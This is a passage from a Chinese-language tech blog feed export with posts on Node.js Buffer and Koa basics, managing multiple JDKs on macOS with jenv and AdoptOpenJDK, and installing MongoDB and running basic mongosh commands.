// ES6 &#x6A21;&#x5757;&#x9700;&#x8981;&#x652F;&#x6301;&#x9759;&#x6001;&#x4EE3;&#x7801;&#x5206;&#x6790;,&#x800C; CommonJS &#x6A21;&#x5757;&#x7684;&#x8F93;&#x51FA;&#x63A5;&#x53E3;&#x662F; module.exports &#x5BF9;&#x8C61;,&#x65E0;&#x6CD5;&#x88AB;&#x9759;&#x6001;&#x5206;&#x6790;,&#x6240;&#x4EE5;&#x53EA;&#x80FD;&#x6574;&#x4F53;&#x52A0;&#x8F7D;
// &#x9700;&#x8981;&#x4F7F;&#x7528;&#x5355;&#x4E00;&#x7684;&#x8F93;&#x51FA;&#x9879;&#x53EF;&#x4EE5;&#x5199;&#x6210;&#x4E0B;&#x9762;&#x8FD9;&#x6837;
import packageMain from &apos;commonjs-package&apos;;
const { method } = packageMain;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="buffer-%E7%BC%93%E5%86%B2%E5%8C%BA">Buffer &#x7F13;&#x51B2;&#x533A;</h2>
<p>&#x6838;&#x5FC3;&#x5E93; Buffer &#x7C7B;&#x4F3C;&#x4E00;&#x4E2A;&#x6574;&#x6570;&#x6570;&#x7EC4;&#xFF0C;&#x5176;&#x5143;&#x7D20;&#x4E3A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x7684;&#x4E24;&#x4F4D;&#x6570;&#x3002;Buffer &#x521B;&#x5EFA;&#x5185;&#x5B58;&#x4E2D;&#x7A7A;&#x95F4;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x8303;&#x56F4;&#x662F; 00-ff =&gt; 0-255 =&gt; 00000000-11111111 =&gt; 8bit =&gt; 1byte&#xFF0C;&#x6240;&#x4EE5;&#x5B9E;&#x9645;&#x4E0A;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x5C31;&#x8868;&#x793A;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x3002;&#x6B64;&#x5916; Buffer &#x4E2D;&#x7684;&#x5185;&#x5B58;&#x4E0D;&#x662F;&#x901A;&#x8FC7; Javascript &#x5206;&#x914D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x5E95;&#x5C42;&#x901A;&#x8FC7; C++ &#x7533;&#x8BF7;&#x7684;&#xFF0C;&#x5BF9;&#x5E94; V8 &#x5806;&#x5185;&#x5B58;&#x4E4B;&#x5916;&#x7684;&#x4E00;&#x5757;&#x539F;&#x59CB;&#x5185;&#x5B58;&#x3002;</p>
<p>&#x670D;&#x52A1;&#x5668;&#x54CD;&#x5E94;&#x7684;&#x53EF;&#x80FD;&#x662F;&#x56FE;&#x7247;&#x3001;&#x97F3;&#x4E50;&#x3001;&#x89C6;&#x9891;&#x4E4B;&#x6D41;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x800C; JavaScript &#x6CA1;&#x6709;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x8FD9;&#x5C31;&#x9700;&#x8981; Buffer &#x5E93;&#x4E3A; NodeJS &#x63D0;&#x4F9B;&#x5B58;&#x50A8;&#x539F;&#x59CB;&#x6570;&#x636E;&#x7684;&#x65B9;&#x6CD5;&#x6765;&#x5904;&#x7406;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x3002;&#x6B64;&#x5916;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x90FD;&#x4F1A;&#x4EE5;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x663E;&#x793A;&#xFF0C;&#x6240;&#x4EE5;&#x5C3D;&#x7BA1;&#x5B58;&#x50A8;&#x7684;&#x662F;&#x4E8C;&#x8FDB;&#x5236;&#xFF0C;&#x663E;&#x793A;&#x7684;&#x5374;&#x8FD8;&#x662F;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x3002;</p>
<pre><code class="language-javascript">console.log(Buffer.from(&apos;Hello zs&apos;)) // &lt;Buffer 48 65 6c 6c 6f 20 7a 73&gt;
console.log(Buffer.from(&apos;Hello zs&apos;).length) // &#x5360;&#x7528;&#x5185;&#x5B58;&#x5927;&#x5C0F;;&#x4E00;&#x4E2A;&#x82F1;&#x6587;&#x5360;1&#x5B57;&#x8282; - 8
console.log(&apos;Hello zs&apos;.length) // &#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6; - 8
console.log(Buffer.from(&apos;Hello &#x7D2B;&apos;).length) // &#x5360;&#x7528;&#x5185;&#x5B58;&#x5927;&#x5C0F;;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#x5360;3&#x5B57;&#x8282; - 9
console.log(&apos;Hello &#x7D2B;&apos;.length) // &#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6; - 7
</code></pre>
<pre><code class="language-javascript">// new Buffer()&#x6784;&#x9020;&#x51FD;&#x6570;&#x6765;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x5B9E;&#x4F8B;,&#x4F46;&#x662F;Buffer&#x5BF9;&#x5185;&#x5B58;&#x7684;&#x6743;&#x9650;&#x64CD;&#x4F5C;&#x76F8;&#x6BD4;&#x5F88;&#x5927;,&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6355;&#x83B7;&#x4E00;&#x4E9B;&#x654F;&#x611F;&#x4FE1;&#x606F;, &#x6240;&#x4EE5;&#x5728;v6.0&#x4EE5;&#x540E;&#x88AB;&#x66FF;&#x4EE3;

// Buffer.alloc(size[, fill[, encoding]]) &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684;Buffer&#x5B9E;&#x4F8B;,&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E; fill,&#x5219;&#x9ED8;&#x8BA4;&#x586B;&#x6EE1; 0.
// Buffer &#x5927;&#x5C0F;&#x4E00;&#x65E6;&#x786E;&#x5B9A;&#x5219;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;,Buffer&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x5BF9;&#x5E95;&#x5C42;&#x5185;&#x5B58;&#x7684;&#x76F4;&#x63A5;&#x64CD;&#x4F5C;,&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x5206;&#x914D;&#x51FA;&#x8FDE;&#x7EED;&#x7684;&#x957F;&#x5EA6;&#x4E3A;&#x786E;&#x5B9A;&#x7684;&#x7A7A;&#x95F4;.&#x8FD9;&#x4E00;&#x70B9;&#x4E0E;&#x6570;&#x7EC4;&#x4E0D;&#x540C;,&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x4E0D;&#x8FDE;&#x7EED;&#x5219;&#x6027;&#x80FD;&#x8F83;&#x5DEE;
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10&#x3001;&#x4E14;&#x7528;0 &#x586B;&#x5145;&#x7684;Buffer
const buf1 = Buffer.alloc(10);
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10&#x3001;&#x4E14;&#x7528; 0x1 &#x586B;&#x5145;&#x7684; Buffer 
const buf2 = Buffer.alloc(10, 1);

// Buffer.allocUnsafe(size)&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x7684; Buffer &#x5B9E;&#x4F8B;,&#x6B64;&#x65B9;&#x6CD5;&#x6BD4;&#x8C03;&#x7528;&#x65E2;&#x5206;&#x914D;&#x7A7A;&#x95F4;&#x53C8;&#x6E05;&#x7A7A;&#x6570;&#x636E;&#x7684; Buffer.alloc() &#x66F4;&#x5FEB;&#x3002;&#x4F46;&#x662F; Buffer &#x5B9E;&#x4F8B;&#x4E0D;&#x4F1A;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x5219;&#x53EF;&#x80FD;&#x5305;&#x542B;&#x654F;&#x611F;&#x7684;&#x65E7;&#x6570;&#x636E;,&#x9700;&#x8981;&#x4F7F;&#x7528; fill() &#x6216; write() &#x91CD;&#x5199;
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x957F;&#x5EA6;&#x4E3A; 10&#x3001;&#x4E14;&#x672A;&#x521D;&#x59CB;&#x5316;&#x7684; Buffer
const buf3 = Buffer.allocUnsafe(10);
// &#x9002;&#x7528;&#x5728;&#x4E0D;&#x786E;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x4ECE;&#x6C60;&#x4E2D;&#x4FDD;&#x7559;&#x4E00;&#x5C0F;&#x5757;&#x5185;&#x5B58;&#x7684;&#x60C5;&#x51B5;
Buffer.allocUnsafeSlow(size)

// Buffer.from(array) &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x88AB; array &#x7684;&#x503C;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65B0;&#x7684; Buffer &#x5B9E;&#x4F8B;,&#x8FD9;&#x91CC;&#x4F20;&#x5165;&#x7684; array &#x7684;&#x5143;&#x7D20;&#x53EA;&#x80FD;&#x662F;&#x6570;&#x5B57;,&#x4E0D;&#x7136;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x88AB; 0 &#x8986;&#x76D6;
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5305;&#x542B; [0x1, 0x2, 0x3] &#x7684; Buffer
const buf4 = Buffer.from([1, 2, 3]);

// Buffer.from(arrayBuffer[, byteOffset[, length]]) &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x65B0;&#x5EFA;&#x7684;&#x4E0E;&#x7ED9;&#x5B9A;&#x7684; ArrayBuffer &#x5171;&#x4EAB;&#x540C;&#x4E00;&#x5185;&#x5B58;&#x7684; Buffer
// Buffer.from(buffer) &#x590D;&#x5236;&#x4F20;&#x5165;&#x7684; Buffer &#x5B9E;&#x4F8B;&#x7684;&#x6570;&#x636E;,&#x5E76;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x65B0;&#x7684; Buffer &#x5B9E;&#x4F8B;
console.log(Buffer.from(Buffer.from(&apos;Hello zs&apos;)), Buffer.compare(Buffer.from(&apos;Hello zs&apos;), Buffer.from(Buffer.from(&apos;Hello zs&apos;)))) // &lt;Buffer 48 65 6c 6c 6f 20 7a 73&gt; 0

// Buffer.from(string[, encoding]) &#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x88AB; string &#x7684;&#x503C;&#x521D;&#x59CB;&#x5316;&#x7684;&#x65B0;&#x7684; Buffer &#x5B9E;&#x4F8B;
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5305;&#x542B; UTF-8 &#x5B57;&#x8282; [0x74, 0xc3, 0xa9, 0x73, 0x74] &#x7684; Buffer
const buf5 = Buffer.from(&apos;t&#xE9;st&apos;);

// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5305;&#x542B; Latin-1 &#x5B57;&#x8282; [0x74, 0xe9, 0x73, 0x74] &#x7684; Buffer
const buf6 = Buffer.from(&apos;t&#xE9;st&apos;, &apos;latin1&apos;);
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="koa2">Koa2</h2>
<p>Express &#x81EA;&#x5E26; Router&#x3001;&#x8DEF;&#x7531;&#x89C4;&#x5219;&#x3001;View &#x7B49;&#x529F;&#x80FD;&#xFF0C;&#x66F4;&#x63A5;&#x8FD1;&#x4E8E; Web FrameWork &#x7684;&#x6982;&#x5FF5;&#x3002;Koa &#x56E0;&#x4E3A;&#x6CA1;&#x6709;&#x6346;&#x7ED1;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x6240;&#x4EE5;&#x8F7B;&#x91CF;&#x7684;&#x540C;&#x65F6;&#x81EA;&#x7531;&#x5EA6;&#x4E5F;&#x66F4;&#x9AD8;&#xFF0C;&#x66F4;&#x50CF;&#x662F;&#x5BF9; HTTP &#x7684;&#x5C01;&#x88C5;&#xFF0C;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x4E00;&#x7CFB;&#x5217; Koa &#x7684;<a href="https://github.com/koajs/koa/wiki">&#x4E2D;&#x95F4;&#x4EF6;</a>&#xFF0C;&#x4EE5;&#x4F9B;&#x6309;&#x9700;&#x7EC4;&#x5408;&#x3002;</p>
<ul>
<li>Hello World</li>
</ul>
<pre><code class="language-javascript">// &#x5FC5;&#x4FEE;&#x7684; hello world &#x5E94;&#x7528;
const Koa = require(&apos;koa&apos;);
const app = new Koa();
app.use(async ctx =&gt; {
  ctx.body = &apos;Hello World&apos;;
});
app.listen(3000);
</code></pre>
<ul>
<li>&#x7EA7;&#x8054;</li>
</ul>
<pre><code class="language-javascript">
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[jenv AdoptOpenJDK JDKs]]></title><description><![CDATA[Use jenv and AdoptOpenJDK to set up multiple JDKs]]></description><link>yourdomain.com/jdks/</link><guid isPermaLink="false">614ccdb5f7263c9315a75845</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Sat, 19 Jun 2021 08:48:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/09/javajdk.png" medium="image"/><content:encoded><![CDATA[<!--kg-card-begin: markdown--><h2 id="open-jdk">Open JDK</h2>
<img src="yourdomain.com/content/images/2021/09/javajdk.png" alt="jenv AdoptOpenJDK JDKs"><p>&#x5173;&#x4E8E; OpenJDK &#x53EA;&#x9700;&#x8981;&#x77E5;&#x9053;&#x5F53;&#x4E0B; Java &#x5F00;&#x53D1;&#x662F;&#x4EE5; OpenJDK &#x5F00;&#x6E90;&#x9879;&#x76EE;&#x7684;&#x5F62;&#x5F0F;&#x8FDB;&#x884C;&#x7684;(GPLv2+CE)&#x3002;&#x7531; Oracle &#x4E3B;&#x5BFC;&#xFF0C;&#x6C47;&#x805A;&#x793E;&#x533A;&#x529B;&#x91CF;&#x53C2;&#x4E0E;&#x5F00;&#x53D1;&#x3002;Oracle &#x63D0;&#x4F9B;&#x9884;&#x5148;&#x7F16;&#x8BD1;&#x7684; OpenJDK &#x79F0;&#x4E3A; Oracle&apos;s OpenJDK&#xFF1B;&#x628A;&#x793E;&#x533A;&#x63D0;&#x4F9B;&#x9884;&#x6784;&#x5EFA;&#x7684; OpenJDK &#x79F0;&#x4E4B;&#x4E3A; <a href="https://adoptopenjdk.net/?variant=openjdk8&amp;jvmVariant=hotspot">AdoptOpenJDK</a>&#x3002;Oracle &#x5BF9; OracleJDK &#x63D0;&#x4F9B;&#x957F;&#x671F;&#x652F;&#x6301;&#x670D;&#x52A1;&#xFF0C;&#x4F46;&#x53EA;&#x63D0;&#x4F9B; 6 &#x4E2A;&#x6708;&#x7684;&#x5B89;&#x5168;&#x66F4;&#x65B0;&#x670D;&#x52A1;&#x7ED9; Oracle&#x2019;s OpenJDK&#x3002;&#x4E3A;&#x6B64; AdoptOpenJDK &#x4EE5;&#x514D;&#x8D39;&#x7684;&#x5F62;&#x5F0F;&#x63D0;&#x4F9B;&#x793E;&#x533A;&#x7248; OpenJDK &#x4E8C;&#x8FDB;&#x5236;&#x5305; 4 &#x5E74;&#x7684;&#x514D;&#x8D39;&#x957F;&#x671F;&#x652F;&#x6301;(LTS)&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%8D%B8%E8%BD%BD-jdk">&#x5378;&#x8F7D; JDK</h2>
<p>&#x7EC8;&#x7AEF;&#x67E5;&#x770B; mac &#x4E2D;&#x88C5;&#x4E86;&#x54EA;&#x4E9B; jdk &#x7248;&#x672C;&#xFF0C;&#x5E76;&#x4EE5;&#x7BA1;&#x7406;&#x5458;&#x8EAB;&#x4EFD;&#x8FDB;&#x884C;&#x5378;&#x8F7D;&#x3002;&#x968F;&#x540E;&#x5C06; .zshrc &#x4E2D;&#x7684;&#x914D;&#x7F6E;&#x6CE8;&#x91CA;&#x3002;</p>
<pre><code class="language-shell">$ ls /Library/Java/JavaVirtualMachines/
jdk-11.0.11.jdk
$ sudo rm -rf /Library/Java/JavaVirtualMachines/jdk-11.0.11.jdk
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="jenv%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6">JENV&#x7248;&#x672C;&#x63A7;&#x5236;</h2>
<pre><code class="language-shell">$ brew install jenv
$ jenv doctor
&gt; jenv doctor
[OK]	No JAVA_HOME set
[ERROR]	Java binary in path is not in the jenv shims.
[ERROR]	Please check your path, or try using /path/to/java/home is not a valid path to java installation.
	PATH : 
[OK]	Jenv is correctly loaded
# &#x82E5;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x60C5;&#x51B5;&#x5219;&#x8868;&#x793A;&#x5B58;&#x5728;&#x914D;&#x7F6E;&#x540D;&#x5360;&#x7528;,&#x9700;&#x8981;&#x5378;&#x8F7D; jdk
[ERROR] JAVA_HOME variable already set, scripts that use it directly could not use java version set by jenv [ERROR] Java binary in path is not in the jenv shims. 
# &#x6CE8;&#x610F;&#x5B89;&#x88C5; jenv &#x914D;&#x7F6E;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5C06; iterm2 &#x914D;&#x7F6E;&#x635F;&#x574F;
</code></pre>
<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6700;&#x65B0;&#x7248;&#x672C;&#x7684; Java &#x662F; system &#x5728; macOS &#x4E0A;&#x7684;&#x9ED8;&#x8BA4;&#x7248;&#x672C;&#x3002;&#x901A;&#x8FC7; jenv local VERSION &#x4E3A;&#x5F53;&#x524D;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x672C;&#x5730; Java &#x7248;&#x672C;&#x3002;&#x540C;&#x65F6;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; .java-version &#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x53EF;&#x4EE5;&#x4E3A;&#x9879;&#x76EE;&#x68C0;&#x5165; Git&#xFF0C;&#x4E14;&#x542F;&#x52A8; shell &#x65F6; jenv &#x786E;&#x4FDD;&#x52A0;&#x8F7D;&#x6B64; java&#x3002;</p>
<pre><code class="language-shell"># &#x6DFB;&#x52A0; Java &#x73AF;&#x5883;
$ brew install openjdk@11
# &#x6CE8;&#x610F;&#x901A;&#x8FC7; brew &#x5B89;&#x88C5;&#x7684; jdk &#x5B58;&#x5728;&#x4E8E; /usr/local/Cellar/...
$ jenv add /usr/local/Cellar/openjdk@11/11.0.12
openjdk64-11.0.12 added
11.0.12 added
11.0 added
11 added
$ brew install openjdk@8
$ jenv add /usr/local/Cellar/openjdk@8/1.8.0+302
openjdk64-1.8.0.302 added
1.8.0.302 added
1.8 added
$ jenv versions
* system (set by /Users/zsxzy/.jenv/version)
  1.8
  1.8.0.302
  11
  11.0
  11.0.12
  openjdk64-1.8.0.302
  openjdk64-11.0.12
$ jenv local 1.8.0.302
$ exec $SHELL -l
$ cat .java-version
1.8.0.302
$ echo ${JAVA_HOME}
/Users/zsxzy/.jenv/versions/1.8.0.302
$ jenv global 1.8.0.302
$ java -version
openjdk version &quot;1.8.0_302&quot;
OpenJDK Runtime Environment (build 1.8.0_302-bre_2021_08_14_21_34-b00)
OpenJDK 64-Bit Server VM (build 25.302-b00, mixed mode)
</code></pre>
<p>&#x5728;&#x8BBE;&#x7F6E;&#x597D;&#x9009;&#x62E9;&#x7684; Java &#x7248;&#x672C;&#x540E;&#xFF0C;&#x901A;&#x8FC7; Java8 &#x7684; java -version &#x6216; Java 9+ &#x7684; java --version &#x67E5;&#x770B;&#x7248;&#x672C;&#x3002;</p>
<p>&#x4F7F;&#x7528; jenv shell VERSION &#x5728;&#x5F53;&#x524D;&#x7279;&#x6B8A;&#x7684; shell &#x4F1A;&#x8BDD;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x8BBE;&#x7F6E;&#x7684; Java&#x3002;jenv which java &#x663E;&#x793A;&#x53EF;&#x6267;&#x884C;&#x7684; Java &#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;&#x3002;</p>
<pre><code class="language-shell">$ jenv shell 11
$ jenv which java
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="adoptopenjdk">AdoptOpenJDK</h2>
<p>Homebrew &#x9ED8;&#x8BA4;&#x53EA;&#x6709;&#x4E24;&#x4E2A;&#x4ED3;&#x5E93; Formulae &#x4E0E; Casks&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; tap &#x6307;&#x4EE4;&#x6DFB;&#x52A0;&#x66F4;&#x591A;&#x4ED3;&#x5E93;&#xFF0C;search &#x5230;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5BB9;&#x3002;<a href="https://github.com/AdoptOpenJDK/homebrew-openjdk">OpenJDK releases</a> &#x9700;&#x8981;&#x5728; tap &#x4E2D;&#x67E5;&#x770B;&#xFF0C;&#x610F;&#x5473;&#x7740;&#x662F;&#x4ECE; brew casks &#x4E2D;&#x5206;&#x79BB;&#x7684;&#x90E8;&#x5206;&#x3002;&#x901A;&#x8FC7; brew tap add &#x6307;&#x5B9A;&#x4ED3;&#x5E93;&#x8FDB;&#x884C;&#x6DFB;&#x52A0;&#x3002;</p>
<pre><code class="language-shell">$ brew tap AdoptOpenJDK/openjdk
$ brew search /adoptopenjdk/
# &#x5B89;&#x88C5;&#x9700;&#x8981;&#x7684; jdk &#x7248;&#x672C;
$ brew install adoptopenjdk11
$ brew install adoptopenjdk8
# &#x6CE8;&#x518C; jenv
$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-11|8.jdk/Contents/Home
# &#x5168;&#x5C40;&#x8BBE;&#x7F6E; JDK
$ jenv global 11
# &#x6216;&#x8005;&#x5BF9;&#x4E8E;&#x9879;&#x76EE;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x7279;&#x5B9A;&#x9879;&#x76EE;
$ cd ~/projects/my_project
$ jenv local 1.8
$ java -version
openjdk version &quot;1.8.0_202&quot;
# &#x53D6;&#x6D88;&#x7248;&#x672C;&#x8BBE;&#x7F6E;
$ jenv global system
$ cd ~/projects/my_project
$ jenv local --unset
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%BB%93%E6%9D%9F">&#x7ED3;&#x675F;</h2>
<p>&#x672C;&#x535A;&#x5BA2;&#x6240;&#x6709;&#x6587;&#x7AE0;&#x9664;&#x7279;&#x522B;&#x58F0;&#x660E;&#x5916;&#xFF0C;&#x5747;&#x91C7;&#x7528;<a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh"> CC BY-SA 4.0 </a>&#x534F;&#x8BAE;&#xFF0C;&#x8F6C;&#x8F7D;&#x8BF7;&#x6CE8;&#x660E;&#x51FA;&#x5904;&#xFF01;</p>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[MongoDB]]></title><description><![CDATA[关系型数据库全是表；No SQL 中都键值对。——文档数据库 MongoDB]]></description><link>yourdomain.com/mongodb/</link><guid isPermaLink="false">611e8b4a0de60f0cb667f229</guid><category><![CDATA[Technology growth]]></category><dc:creator><![CDATA[Ziyi Xie]]></dc:creator><pubDate>Thu, 20 May 2021 14:52:00 GMT</pubDate><media:content url="yourdomain.com/content/images/2021/08/mongodb.jpg" medium="image"/><content:encoded><![CDATA[<img src="yourdomain.com/content/images/2021/08/mongodb.jpg" alt="MongoDB"><p></p><!--kg-card-begin: markdown--><h2 id="%E5%88%9D%E8%AF%86">&#x521D;&#x8BC6;</h2>
<p>MongoDB@3.2 &#x540E;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x6539;&#x52A8;&#xFF0C;&#x4F7F;&#x7528;&#x65F6;&#x63A8;&#x8350;<a href="https://docs.mongoing.com/">&#x5B98;&#x65B9;&#x4E2D;&#x6587;&#x6587;&#x6863;</a>&#x3002;</p>
<p>&#x5B89;&#x88C5; MongoDB 5.0 &#x793E;&#x533A;&#x7248;&#xFF08;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#xFF1A;Xcode &#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#x3001;Homebrew&#xFF09;&#xFF1A;</p>
<ul>
<li>&#x4E0B;&#x8F7D; MongoDB &#x548C;&#x6570;&#x636E;&#x5E93;&#x5DE5;&#x5177;&#x5E76;&#x5B89;&#x88C5;</li>
</ul>
<pre><code class="language-shell"># tap &#x547D;&#x4EE4;&#x5141;&#x8BB8; Homebrew &#x8FDB;&#x5165;&#x53E6;&#x4E00;&#x4E2A;&#x516C;&#x5F0F;&#x5B58;&#x50A8;&#x5E93;. &#x5B8C;&#x6210;&#x6B64;&#x64CD;&#x4F5C;&#x5219;&#x6269;&#x5C55;&#x53EF;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x7684;&#x9009;&#x9879;
brew tap mongodb/brew
# &#x5B89;&#x88C5;
brew install mongodb-community@5.0
</code></pre>
<p>&#x5B89;&#x88C5;&#x4F1A;&#x5728;&#x4EE5;&#x4E0B;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#x548C;&#x76EE;&#x5F55;&#xFF0C;&#x5177;&#x4F53;&#x53D6;&#x51B3;&#x4E8E; Apple &#x786C;&#x4EF6;&#xFF1A;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: html--><table border="1">
    <tr>
        <th>  </th>
        <th> &#x82F1;&#x7279;&#x5C14;&#x5904;&#x7406;&#x5668; </th>
        <th> M1&#x5904;&#x7406;&#x5668; </th>
    </tr>
    <tbody style="text-align:center">
    <tr>
        <td> &#x914D;&#x7F6E;&#x6587;&#x4EF6; </td>
        <td> /usr/local/etc/mongod.conf </td>
        <td> /opt/homebrew/etc/mongod.conf </td>
    </tr>
    <tr>
        <td> log directory </td>
        <td> /usr/local/var/log/mongodb </td>
        <td> /opt/homebrew/var/log/mongodb </td>
    </tr>
    <tr>
        <td> data directory </td>
        <td> /usr/local/var/mongodb </td>
        <td> /opt/homebrew/var/mongodb </td>
    </tr>
    </tbody>
</table><!--kg-card-end: html--><!--kg-card-begin: markdown--><ul>
<li>&#x57FA;&#x672C;&#x64CD;&#x4F5C;</li>
</ul>
<pre><code class="language-sql"># &#x5C06; MongoDB(&#x5373;mongod&#x8FDB;&#x7A0B;)&#x4F5C;&#x4E3A; macOS &#x670D;&#x52A1;&#x8FD0;&#x884C;|&#x505C;&#x6B62;
brew services start|stop mongodb-community@5.0
# &#x9A8C;&#x8BC1;&#x662F;&#x5426;&#x6B63;&#x5728;&#x8FD0;&#x884C;
brew services list
# &#x8FDE;&#x63A5;&#x548C;&#x4F7F;&#x7528; MongoDB
mongosh
# &#x5C55;&#x793A;&#x6570;&#x636E;&#x5E93;
show databases; # &#x6216;&#x8005; show dbs;
# &#x663E;&#x793A;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;
db
# &#x67E5;&#x770B;&#x7248;&#x672C;&#x4FE1;&#x606F;
db.version();
# &#x9009;&#x4E2D;&#x6570;&#x636E;&#x5E93;
use $yourdatabase; # &#x5982;&#x679C;&#x6CA1;&#x6709;&#x4F1A;&#x9690;&#x5F0F;&#x521B;&#x5EFA;
# &#x67E5;&#x770B;&#x8868;(&#x96C6;&#x5408;)
show tables; # &#x56E0;&#x4E3A;&#x5E76;&#x975E;&#x591A;&#x884C;&#x591A;&#x5217;,&#x53EB;&#x8868;&#x4E0D;&#x5408;&#x9002;
show collections; &#x2714;&#xFE0F;
# &#x521B;&#x5EFA;&#x96C6;&#x5408;
db.createCollection(&quot;necessities&quot;); # { ok: 1 }
# &#x5220;&#x9664;&#x96C6;&#x5408;
db.collectionName.drop(); # true
# &#x5220;&#x9664;&#x6570;&#x636E;&#x5E93;
db.dropDatabase(); # &#x5220;&#x9664;&#x5F53;&#x524D;&#x9009;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;
# &#x63D2;&#x5165; JSON &#x6570;&#x636E;
db.necessities.insert({&quot;name&quot;:&quot;Dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;}); # &#x274C; DeprecationWarning: Collection.insert() is deprecated. Use insertOne, insertMany, or bulkWrite. 
# 3.2 &#x7248;&#x672C;&#x4E4B;&#x540E;&#x65B0;&#x589E;&#x4E86; db.collection.insertOne() &#x548C; db.collection.insertMany()
db.necessities.insertOne({&quot;name&quot;:&quot;Dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;}); # &#x2714;&#xFE0F;
